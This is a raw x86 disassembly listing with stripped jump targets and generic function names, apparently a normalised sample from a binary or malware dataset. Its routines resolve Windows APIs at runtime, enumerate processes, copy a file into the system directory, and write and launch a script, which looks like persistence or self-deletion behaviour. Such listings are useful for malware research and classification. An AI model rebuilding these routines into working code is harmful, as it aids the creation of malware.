jne r-xdata
xor eax eax
mov dl [ ecx ]
mov [ esi + ecx ] dl
inc ecx
cmp dl bl
jne r-xdata
mov [ eax ] bl
lea eax [ ebp - 0xfe ]
mov edx eax
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
push edi
lea edi [ ebp - 0x208 ]
sub eax edx
dec edi
mov cl [ edi + 0x1 ]
inc edi
cmp cl bl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
sub_2002032
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
sub esp 0x348
push ebx
xor ebx ebx
push esi
push edi
cmp eax ebx
je r-xdata
xor eax eax
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
je r-xdata
mov esi 0x104
push esi
lea eax [ ebp - 0x21b ]
push ebx
push eax
mov [ ebp - 0x21c ] bl
call sub_2013580
push esi
lea eax [ ebp - 0x113 ]
push ebx
push eax
mov [ ebp - 0x114 ] bl
call sub_2013580
lea eax [ ebp - 0x21c ]
push r--data
push eax
call sub_200101f
lea eax [ ebp - 0x114 ]
push r--data
push eax
call sub_200101f
mov esi [ GetModuleHandleA@IAT ]
add esp 0x28
lea eax [ ebp - 0x114 ]
push eax
lea eax [ ebp - 0x21c ]
push eax
call esi
mov edi [ GetProcAddress@IAT ]
push eax
call edi
mov [ ebp - 0xc ] eax
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x114 ]
push r--data
push eax
call sub_200101f
pop ecx
pop ecx
lea eax [ ebp - 0x114 ]
push eax
lea eax [ ebp - 0x21c ]
push eax
call esi
push eax
call edi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
push ebx
push 0x2
call CreateToolhelp32Snapshot
mov edi eax
cmp edi 0xffffffff
je r-xdata
push r--data
push [ ebp + 0x8 ]
call sub_200a1e4
pop ecx
pop ecx
mov [ ebp + 0x8 ] eax
cmp eax ebx
je r-xdata
push edi
call [ CloseHandle@IAT ]
mov esi 0x128
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x320 ]
push eax
call sub_2009b94
pop ecx
pop ecx
test eax eax
je r-xdata
push r--data
push ebx
call sub_200a1e4
pop ecx
pop ecx
mov [ ebp + 0x8 ] eax
cmp eax ebx
jne r-xdata
push edi
call [ CloseHandle@IAT ]
xor eax eax
inc eax
jmp r-xdata
lea eax [ ebp - 0x344 ]
push eax
push edi
mov [ ebp - 0x344 ] esi
call [ ebp - 0x8 ]
lea eax [ ebp - 0x344 ]
push eax
push edi
mov [ ebp - 0x344 ] esi
call [ ebp - 0xc ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_200219f
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ eax ]
mov eax [ ebp + 0xc ]
mov esi [ eax ]
mov ebx [ esi + edi - 0x6 ]
lea eax [ esi - 0x6 ]
cmp eax ebx
jae r-xdata
push ebx
call sub_2009eef
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
sub esi ebx
push ebx
lea ecx [ esi + edi - 0x6 ]
push ecx
push eax
call sub_200109f
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_2009d98
mov eax ebx
imul eax eax 0x6
push eax
mov [ ebp - 0x8 ] eax
call sub_2009eef
mov edi eax
add esp 0x14
test edi edi
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
push ebx
push [ ebp - 0x4 ]
lea esi [ ebp - 0x8 ]
push edi
call sub_2005af0
add esp 0xc
push [ ebp - 0x4 ]
test eax eax
jge r-xdata
push [ ebp - 0x4 ]
call sub_2009d98
call sub_2009d98
mov eax [ ebp + 0x8 ]
mov [ eax ] edi
mov eax [ ebp - 0x8 ]
pop ecx
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
call sub_2009d98
push edi
call sub_2009d98
pop ecx
jmp r-xdata
pop ecx
jmp r-xdata
sub_200224b
push ebp
mov ebp esp
push ecx
push ecx
push edi
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push [ esi ]
mov [ ebp - 0x8 ] 0x1
mov [ ebp - 0x4 ] 0x100
call [ RegQueryValueExA@IAT ]
push [ esi ]
mov edi eax
call [ RegCloseKey@IAT ]
xor eax eax
test edi edi
sete al
pop edi
leave
retn
sub_200228a
push ebp
mov ebp esp
sub esp 0x18
push ebx
xor eax eax
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x8 ] eax
inc [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0x3
jl r-xdata
mov ebx esi
call sub_2004c21
test eax eax
jne r-xdata
push [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
call sub_2004b0d
mov esi eax
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
cmp [ ebp - 0x8 ] 0x3
jne r-xdata
call sub_2004aa8
mov esi [ ebp - 0x10 ]
and [ ebp - 0x4 ] 0x0
lea edi [ ebp - 0xc ]
lea ebx [ ebp - 0x4 ]
mov [ ebp - 0xc ] 0x4
call sub_2005909
xor ebx ebx
cmp [ ebp - 0x4 ] ebx
jg r-xdata
xor eax eax
jmp r-xdata
push [ ebp - 0x4 ]
call sub_2009eef
mov edi eax
pop ecx
cmp edi ebx
jne r-xdata
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x4 ] 0x400
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x4 ]
push edi
jmp r-xdata
mov esi [ ebp - 0x10 ]
call sub_2004aa8
jmp r-xdata
mov eax [ ebp - 0x10 ]
call sub_20054b9
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jbe r-xdata
mov esi [ ebp - 0x10 ]
call sub_2004aa8
mov eax [ ebp + 0x10 ]
mov [ eax ] ebx
mov eax edi
add ebx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
cmp ebx eax
jl r-xdata
lea ecx [ ebp - 0xc ]
push ecx
sub eax ebx
push eax
lea eax [ ebx + edi ]
push eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea esi [ eax + 0x19000 ]
push esi
push edi
call sub_200aaac
pop ecx
pop ecx
test eax eax
je r-xdata
mov edi eax
mov eax esi
mov [ ebp - 0x4 ] eax
sub_2002384
push ebp
mov ebp esp
sub esp 0x110
push ebx
push esi
xor ebx ebx
push 0x103
lea eax [ ebp - 0x10f ]
push ebx
push eax
mov [ edi ] ebx
mov [ ebp - 0x110 ] bl
call sub_2013580
add esp 0xc
lea eax [ ebp - 0x110 ]
push r--data
push eax
call sub_200101f
pop ecx
pop ecx
lea eax [ ebp - 0x110 ]
push eax
call sub_20048d1
mov [ ebp - 0x4 ] eax
cmp eax ebx
jne r-xdata
push r--data
push [ ebp + 0x8 ]
call sub_200a1e4
push r--data
push ebx
call sub_200a1e4
add esp 0x10
cmp eax ebx
jne r-xdata
xor eax eax
push eax
call sub_200a075
pop ecx
push 0x50
pop eax
jmp r-xdata
push edi
push [ ebp + 0xc ]
push esi
call sub_200228a
add esp 0xc
mov ebx eax
call sub_2004aa8
jmp r-xdata
mov esi [ ebp - 0x4 ]
call sub_2004aa8
mov eax ebx
jmp r-xdata
push eax
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call sub_20049e6
mov esi eax
cmp esi ebx
jne r-xdata
pop esi
pop ebx
leave
retn
sub_2002439
push ebp
mov ebp esp
sub esp 0x264
and [ ebp - 0x4 ] 0x0
push ebx
xor eax eax
push esi
inc eax
push edi
mov [ ebp - 0x8 ] eax
mov [ rw-data ] eax
lea eax [ ebp - 0x158 ]
push r--data
push eax
call sub_200101f
mov ebx [ Sleep@IAT ]
pop ecx
pop ecx
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x3
jne r-xdata
lea eax [ ebp - 0x260 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea edi [ ebp - 0xc ]
call sub_2002384
pop ecx
pop ecx
test eax eax
jne r-xdata
mov esi [ ebp - 0x4 ]
shl esi 0x5
lea eax [ ebp + esi + 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_200101f
lea eax [ ebp + esi + 0x6e ]
push eax
lea eax [ ebp - 0x50 ]
push eax
call sub_200101f
push r--data
push r--data
lea eax [ ebp - 0x50 ]
push eax
lea eax [ ebp - 0x158 ]
push eax
lea eax [ ebp - 0x260 ]
push eax
call sub_2009be6
lea eax [ ebp - 0x30 ]
add esp 0x24
lea edx [ eax + 0x1 ]
call sub_200a6bf
push 0xa
cdq
pop ecx
idiv ecx
imul edx edx 0x2710
push edx
call ebx
and [ ebp - 0x4 ] 0x0
jmp r-xdata
push eax
call sub_2009d98
pop ecx
pop edi
xor eax eax
pop esi
inc eax
pop ebx
leave
retn
call sub_200a6bf
push 0xa
cdq
pop ecx
idiv ecx
imul edx edx 0x3e8
push edx
call ebx
push 0x2
pop eax
cmp [ ebp - 0x8 ] eax
jne r-xdata
mov [ ebp - 0x8 ] eax
mov [ rw-data ] eax
xor eax eax
inc eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] eax
jmp r-xdata
sub_200254a
push ebp
mov ebp esp
sub esp 0x398
push ebx
xor ebx ebx
push esi
push edi
cmp [ ebp + 0x8 ] ebx
je r-xdata
xor eax eax
mov esi 0x104
push esi
lea eax [ ebp - 0x393 ]
push ebx
push eax
mov [ ebp - 0x394 ] bl
call sub_2013580
push esi
lea eax [ ebp - 0x28b ]
push ebx
push eax
mov [ ebp - 0x28c ] bl
call sub_2013580
lea eax [ ebp - 0x394 ]
push r--data
push eax
call sub_200101f
lea eax [ ebp - 0x28c ]
push r--data
push eax
call sub_200101f
mov esi [ GetModuleHandleA@IAT ]
add esp 0x28
lea eax [ ebp - 0x28c ]
push eax
lea eax [ ebp - 0x394 ]
push eax
call esi
mov edi [ GetProcAddress@IAT ]
push eax
call edi
mov [ ebp - 0x18 ] eax
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x28c ]
push r--data
push eax
call sub_200101f
pop ecx
pop ecx
lea eax [ ebp - 0x28c ]
push eax
lea eax [ ebp - 0x394 ]
push eax
call esi
push eax
call edi
mov [ ebp - 0x14 ] eax
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x8 ]
push ebx
push 0x2
mov [ eax ] bl
call CreateToolhelp32Snapshot
mov [ ebp - 0x10 ] eax
cmp eax 0xffffffff
je r-xdata
mov esi r--data
lea edi [ ebp - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x34
lea eax [ ebp - 0x50 ]
push ebx
push eax
movsd [ edi ] [ esi ]
call sub_2013580
xor eax eax
mov [ ebp - 0xc ] bl
lea edi [ ebp - 0xb ]
stosd [ edi ]
add esp 0xc
stosb [ edi ]
lea eax [ ebp - 0x184 ]
push eax
push [ ebp - 0x10 ]
mov [ ebp - 0x184 ] 0x128
call [ ebp - 0x18 ]
jmp r-xdata
test eax eax
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
lea eax [ ebp - 0x160 ]
push eax
call sub_2009b94
pop ecx
pop ecx
test eax eax
je r-xdata
push [ ebp - 0x10 ]
call [ CloseHandle@IAT ]
xor eax eax
inc eax
jmp r-xdata
lea eax [ ebp - 0x184 ]
push eax
push [ ebp - 0x10 ]
mov [ ebp - 0x184 ] 0x128
call [ ebp - 0x14 ]
mov al [ ebp - 0x160 ]
mov [ ebp - 0xa ] al
mov al [ ebp - 0x15f ]
mov [ ebp - 0x8 ] al
mov al [ ebp - 0x15e ]
mov [ ebp - 0xb ] al
mov al [ ebp - 0x15d ]
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x15c ]
mov [ ebp - 0xc ] al
lea eax [ ebp - 0xc ]
mov edx eax
pop edi
pop esi
pop ebx
leave
retn
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
mov edi [ ebp + 0x8 ]
sub eax edx
dec edi
mov cl [ edi + 0x1 ]
inc edi
cmp cl bl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
sub_2002708
test esi esi
jne r-xdata
mov eax esi
lea ecx [ eax + 0x1 ]
xor eax eax
retn
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
movzx ecx ax
xor eax eax
test cx cx
je r-xdata
retn
xor edx edx
cmp ax cx
jge r-xdata
xor eax eax
inc eax
movsx eax dx
mov al [ eax + esi ]
cmp al 0x30
jl r-xdata
cmp al 0x41
jl r-xdata
cmp al 0x39
jle r-xdata
sub al 0x61
cmp al 0x5
ja r-xdata
cmp al 0x46
jle r-xdata
inc edx
cmp dx cx
jl r-xdata
sub_2002754
push ebp
mov ebp esp
sub esp 0xfd4
push ebx
push esi
push edi
xor ebx ebx
push 0x27
lea eax [ ebp - 0x4f ]
push ebx
push eax
mov [ ebp - 0x50 ] bl
call sub_2013580
add esp 0xc
push 0x7ff
lea eax [ ebp - 0xfcf ]
push ebx
push eax
mov [ ebp - 0xfd0 ] bl
call sub_2013580
add esp 0xc
push 0x3ff
lea eax [ ebp - 0x7cf ]
push ebx
push eax
mov [ ebp - 0x7d0 ] bl
call sub_2013580
add esp 0xc
mov esi 0x103
push esi
lea eax [ ebp - 0x157 ]
push ebx
push eax
mov [ ebp - 0x158 ] bl
call sub_2013580
add esp 0xc
push esi
lea eax [ ebp - 0x2c7 ]
push ebx
push eax
mov [ ebp - 0x2c8 ] bl
call sub_2013580
lea eax [ ebp + 0x76 ]
add esp 0xc
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] eax
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
je r-xdata
inc [ ebp - 0x14 ]
add [ ebp - 0x10 ] 0x20
cmp [ ebp - 0x14 ] 0x3
jl r-xdata
xor eax eax
mov eax [ ebp - 0x10 ]
add eax 0xffffff9a
push eax
lea eax [ ebp - 0x158 ]
push eax
call sub_200101f
pop ecx
lea eax [ ebp - 0x158 ]
pop ecx
lea edx [ eax + 0x1 ]
or eax 0xffffffff
mov cl [ ebp + eax - 0x158 ]
mov [ ebp + eax - 0x50 ] cl
inc eax
cmp cl bl
jne r-xdata
push [ ebp - 0x10 ]
lea eax [ ebp - 0x178 ]
push eax
call sub_200101f
lea eax [ ebp - 0x158 ]
push r--data
push eax
call sub_200101f
push [ ebp + 0xc ]
lea eax [ ebp - 0x178 ]
push [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x158 ]
push eax
lea eax [ ebp - 0xfd0 ]
push eax
call sub_2009be6
add esp 0x24
lea eax [ ebp - 0xfd0 ]
push eax
lea eax [ ebp - 0x50 ]
push eax
lea edi [ ebp - 0x8 ]
mov [ ebp - 0x8 ] ebx
call sub_2002384
cmp [ ebp - 0x8 ] 0x4
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
jb r-xdata
cmp [ ebp - 0x4 ] ebx
je r-xdata
mov esi [ ebp + 0xc ]
push 0x4
push eax
push esi
call sub_200a0c0
add esp 0xc
push [ ebp - 0x4 ]
mov [ esi + 0x4 ] bl
call sub_2009d98
pop ecx
call sub_2002708
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_2009d98
pop ecx
push ebx
push [ ebp + 0x8 ]
mov ebx esi
call sub_20016f5
lea eax [ ebp - 0x158 ]
push r--data
push eax
call sub_200101f
push ebx
push [ ebp + 0x8 ]
lea eax [ ebp - 0x178 ]
push eax
lea eax [ ebp - 0x158 ]
push eax
lea eax [ ebp - 0xfd0 ]
push eax
call sub_2009be6
lea eax [ ebp - 0x7d0 ]
add esp 0x24
push eax
call sub_200254a
pop ecx
test eax eax
je r-xdata
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xfd0 ]
push eax
lea eax [ ebp - 0x50 ]
push eax
lea edi [ ebp - 0x8 ]
call sub_2002384
cmp [ ebp - 0x8 ] 0x400
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
jbe r-xdata
lea eax [ ebp - 0x158 ]
push r--data
push eax
call sub_200101f
pop ecx
lea eax [ ebp - 0x158 ]
pop ecx
mov edx eax
xor ebx ebx
mov eax edi
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_200219f
pop ecx
pop ecx
test eax eax
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ ebp - 0xfd0 ]
sub eax edx
dec edi
push [ ebp - 0x8 ]
lea edx [ ebp - 0x28 ]
push [ ebp - 0x4 ]
mov [ ebp - 0x24 ] 0xcc22ccfc
mov [ ebp - 0x28 ] 0xff4cc3ff
mov [ ebp - 0x20 ] 0x32afaa
mov [ ebp - 0x1c ] 0x4d447c0a
call sub_2003618
pop ecx
pop ecx
mov [ ebp - 0x18 ] eax
test eax eax
jbe r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
lea eax [ ebp - 0x7d0 ]
[ edi ] [ esi ]
mov ecx eax
lea eax [ ebp - 0x158 ]
push rw-data
push eax
call sub_200101f
lea eax [ ebp - 0x158 ]
push eax
call sub_2002032
add esp 0xc
mov esi eax
lea eax [ ebp - 0x158 ]
push rw-data
push eax
call sub_200101f
lea eax [ ebp - 0x158 ]
push eax
call sub_2002032
xor ebx ebx
add esp 0xc
cmp esi ebx
jne r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
lea edi [ ebp - 0xfd0 ]
sub eax ecx
mov esi ecx
dec edi
cmp eax ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
push 0x103
lea eax [ ebp - 0x2c7 ]
push ebx
push eax
mov [ ebp - 0x2c8 ] bl
call sub_2013580
add esp 0xc
lea eax [ ebp - 0x158 ]
push r--data
push eax
call sub_200101f
pop ecx
pop ecx
push 0x104
lea eax [ ebp - 0x3d0 ]
push eax
lea eax [ ebp - 0x158 ]
push eax
call [ ExpandEnvironmentStringsA@IAT ]
lea eax [ ebp - 0x3d0 ]
push r--data
push eax
call sub_200a369
mov esi eax
pop ecx
pop ecx
cmp esi ebx
jne r-xdata
mov ebx 0x104
push ebx
lea eax [ ebp - 0x158 ]
push eax
call [ GetSystemDirectoryA@IAT ]
lea eax [ ebp - 0x2c8 ]
push r--data
push eax
call sub_200101f
pop ecx
lea eax [ ebp - 0x2c8 ]
pop ecx
mov edx eax
push 0x104
lea eax [ ebp - 0x158 ]
push eax
call [ GetSystemDirectoryA@IAT ]
lea eax [ ebp - 0x2c8 ]
push r--data
push eax
call sub_200101f
pop ecx
lea eax [ ebp - 0x2c8 ]
pop ecx
mov edx eax
push esi
push [ ebp - 0x8 ]
push 0x1
push [ ebp - 0x4 ]
call sub_200a8ab
push esi
call sub_200adb2
add esp 0x14
xor eax eax
push [ ebp - 0x4 ]
call sub_2009d98
pop ecx
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ ebp - 0x158 ]
sub eax edx
dec edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ ebp - 0x158 ]
sub eax edx
dec edi
mov cl [ ebp + eax - 0x3d0 ]
mov [ ebp + eax - 0x2c8 ] cl
inc eax
test cl cl
jne r-xdata
lea edi [ ebp - 0x3d0 ]
dec edi
xor eax eax
jmp r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
push ebx
lea eax [ ebp - 0x3cf ]
and ecx 0x3
push 0x0
push eax
[ edi ] [ esi ]
mov [ ebp - 0x3d0 ] 0x0
call sub_2013580
add esp 0xc
mov esi 0x105
push esi
lea eax [ ebp - 0x3d0 ]
push eax
push r--data
call [ ExpandEnvironmentStringsA@IAT ]
test eax eax
jbe r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
lea eax [ ebp - 0x3d0 ]
push r--data
mov esi r--data
push eax
movsw [ edi ] [ esi ]
call sub_200a369
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x158 ]
push 0x5c
push eax
call sub_200a930
pop ecx
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
lea edi [ eax + ecx ]
mov ecx 0x16a
lea esi [ ebp + 0xd8 ]
[ edi ] [ esi ]
push edi
xor esi esi
push 0x5a8
inc esi
lea eax [ ebp + 0xd8 ]
push esi
push eax
call sub_200a8ab
push edi
call sub_200adb2
add esp 0x14
push 0x44
pop edi
push edi
lea eax [ ebp - 0x1c0 ]
push ebx
push eax
call sub_2013580
mov [ ebp - 0x1c0 ] edi
xor eax eax
lea edi [ ebp - 0x28 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
xor eax eax
lea edi [ ebp - 0x2c8 ]
add esp 0xc
mov [ ebp - 0x194 ] esi
mov [ ebp - 0x190 ] ax
dec edi
inc eax
push eax
lea eax [ ebp - 0x3d0 ]
push esi
push eax
call sub_200acc7
add esp 0xc
push 0x0
lea eax [ ebp - 0x3d0 ]
push eax
lea eax [ ebp - 0x158 ]
push eax
call [ CopyFileA@IAT ]
test eax eax
je r-xdata
push 0x3e8
call [ Sleep@IAT ]
jmp r-xdata
inc [ ebp - 0xc ]
cmp [ ebp - 0xc ] 0x1
lea eax [ ebp - 0x158 ]
jne r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
lea eax [ ebp - 0x158 ]
push r--data
mov esi r--data
push eax
movsw [ edi ] [ esi ]
call sub_200101f
pop ecx
lea eax [ ebp - 0x158 ]
pop ecx
mov edx eax
lea eax [ ebp - 0x3d0 ]
push eax
lea eax [ ebp - 0x158 ]
push ebx
push eax
call sub_200a6e1
add esp 0xc
push 0x104
push eax
call [ GetSystemDirectoryA@IAT ]
lea eax [ ebp - 0x2c8 ]
push r--data
push eax
call sub_200101f
pop ecx
lea eax [ ebp - 0x2c8 ]
pop ecx
mov edx eax
push eax
call sub_2001edb
pop ecx
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ ebp - 0x2c8 ]
sub eax edx
dec edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ ebp - 0x158 ]
sub eax edx
dec edi
push 0x0
push [ ebp - 0x4 ]
lea eax [ ebp - 0x158 ]
push eax
call sub_2001a1b
add esp 0xc
test eax eax
jne r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x1c0 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x2c8 ]
push eax
and ecx 0x3
push ebx
[ edi ] [ esi ]
call [ CreateProcessA@IAT ]
jmp r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
cmp [ ebp - 0xc ] 0x3
[ edi ] [ esi ]
jle r-xdata
sub_2002dfc
push ebp
mov ebp esp
sub esp 0xa7c
push ebx
push esi
push edi
xor ebx ebx
mov esi 0x103
push esi
mov edi eax
lea eax [ ebp - 0x167 ]
push ebx
push eax
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x168 ] bl
call sub_2013580
add esp 0xc
push esi
lea eax [ ebp - 0x26f ]
push ebx
push eax
mov [ ebp - 0x270 ] bl
call sub_2013580
add esp 0xc
inc esi
cmp edi ebx
je r-xdata
push esi
lea eax [ ebp - 0x270 ]
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
mov eax edi
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x168 ]
push rw-data
push eax
call sub_200101f
lea eax [ ebp - 0x168 ]
push eax
call sub_2002032
add esp 0xc
test eax eax
je r-xdata
mov [ ebp - 0x4 ] edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
je r-xdata
lea eax [ ebp - 0x168 ]
push rw-data
push eax
call sub_200101f
lea eax [ ebp - 0x168 ]
push eax
call sub_2002032
add esp 0xc
test eax eax
je r-xdata
mov [ ebp - 0x4 ] edi
lea edx [ ebp - 0x270 ]
mov eax edi
sub edx edi
push esi
lea eax [ ebp - 0x587 ]
push ebx
push eax
mov [ ebp - 0x588 ] bl
call sub_2013580
add esp 0xc
push esi
lea eax [ ebp - 0x47f ]
push ebx
push eax
mov [ ebp - 0x480 ] bl
call sub_2013580
add esp 0xc
lea eax [ ebp - 0x588 ]
push r--data
push eax
call sub_200101f
lea eax [ ebp - 0x480 ]
push r--data
push eax
call sub_200101f
add esp 0x10
lea eax [ ebp - 0x480 ]
push eax
lea eax [ ebp - 0x588 ]
push eax
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] edi
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
cmp cl bl
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp - 0x4 ] ebx
je r-xdata
lea eax [ ebp - 0x168 ]
push rw-data
push eax
call sub_200101f
lea eax [ ebp - 0x168 ]
push eax
call sub_2002032
xor edi edi
add esp 0xc
inc edi
test eax eax
je r-xdata
lea eax [ ebp - 0x168 ]
push r--data
push eax
call sub_200101f
mov esi [ lstrcpyA@IAT ]
pop ecx
pop ecx
lea eax [ ebp - 0x270 ]
push eax
lea eax [ ebp - 0x690 ]
push eax
call esi
lea eax [ ebp - 0x690 ]
push 0x5c
push eax
call sub_200a930
pop ecx
mov [ eax ] bl
pop ecx
lea eax [ ebp - 0x690 ]
push eax
lea eax [ ebp - 0x378 ]
push eax
call esi
mov esi [ lstrcatA@IAT ]
push r--data
lea eax [ ebp - 0x378 ]
push eax
call esi
lea eax [ ebp - 0x168 ]
push eax
lea eax [ ebp - 0x378 ]
push eax
call esi
push ebx
push 0x8000080
push 0x2
push ebx
push ebx
push 0x40000000
lea eax [ ebp - 0x378 ]
push eax
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
push 0x4
push ebx
lea ecx [ ebp - 0x270 ]
push ecx
call eax
jmp r-xdata
push ebx
call [ PostQuitMessage@IAT ]
lea eax [ ebp - 0x378 ]
push eax
lea eax [ ebp - 0x270 ]
push eax
push eax
lea eax [ ebp - 0xa78 ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0x14
push ebx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xa78 ]
push eax
call [ lstrlenA@IAT ]
push eax
lea eax [ ebp - 0xa78 ]
push eax
push esi
call [ WriteFile@IAT ]
push esi
mov esi [ CloseHandle@IAT ]
call esi
push 0x64
call [ Sleep@IAT ]
push 0x44
pop edi
push edi
lea eax [ ebp - 0x60 ]
push ebx
push eax
call sub_2013580
add esp 0xc
xor eax eax
mov [ ebp - 0x30 ] ax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
push ebx
push ebx
push edi
push ebx
push ebx
push ebx
lea eax [ ebp - 0x378 ]
push eax
push ebx
mov [ ebp - 0x60 ] edi
mov [ ebp - 0x34 ] 0x1
call [ CreateProcessA@IAT ]
test eax eax
je r-xdata
mov edi [ SetThreadPriority@IAT ]
push 0xfffffff1
push [ ebp - 0x14 ]
call edi
push 0xf
call [ GetCurrentThread@IAT ]
push eax
call edi
push 0x80
call [ GetCurrentProcess@IAT ]
push eax
call [ SetPriorityClass@IAT ]
push [ ebp - 0x18 ]
call esi
push [ ebp - 0x14 ]
call [ ResumeThread@IAT ]
push [ ebp - 0x14 ]
call esi
sub_20030f6
push ebp
mov ebp esp
sub esp 0x114
push ebx
push esi
push edi
xor ebx ebx
push 0x103
lea eax [ ebp - 0x113 ]
push ebx
push eax
mov [ ebp - 0x114 ] bl
call sub_2013580
lea eax [ ebp - 0x114 ]
push r--data
push eax
call sub_200101f
add esp 0x14
lea eax [ ebp - 0x114 ]
push eax
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
xor eax eax
lea eax [ ebp - 0x114 ]
push r--data
push eax
call sub_200101f
mov esi [ GetProcAddress@IAT ]
pop ecx
pop ecx
lea eax [ ebp - 0x114 ]
push eax
push edi
call esi
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x114 ]
push r--data
push eax
call sub_200101f
pop ecx
pop ecx
lea eax [ ebp - 0x114 ]
push eax
push edi
call esi
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x8 ] ebx
je r-xdata
cmp eax ebx
je r-xdata
